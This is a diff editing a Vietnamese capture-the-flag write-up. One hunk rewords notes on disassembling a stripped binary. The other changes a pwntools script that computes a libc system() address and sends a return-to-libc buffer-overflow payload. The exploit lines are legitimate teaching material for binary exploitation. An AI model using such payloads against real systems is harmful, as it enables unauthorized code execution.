@@ -20,8 +20,8 @@ You: ok girl
 root@kali:~#
 ```
 
-2 chỗ nhập khó nhiều 1 chỗ nhập chứ :cry: Disassembly ra thôi. Con này stripped rồi nên một là dùng `objdump` để xem code, hai là dùng tool ngoài.
-> Disassembly bằng Radare2, IDA hay Binary Ninja... nhé. Nhiều tool lắm.
+Con này stripped rồi nên không dùng `gdb` để xem `main` được, dùng `objdump` hay cái gì đó khác nhé.
+> Radare2, IDA hay Binary Ninja...
 ```asm
 ...
 
@@ -211,7 +211,7 @@ system = u32(ebp_8)-(0x1d8d80-0x3d200)
 print "system: %s" % hex(system)
 
 s2 = "A"*32 + p32(system) + "JUNK" + p32(0x08048890)
-print p.recvline()
+print p.recvlines(2)
 print p.recv(5)
 
 p.sendline(s2)
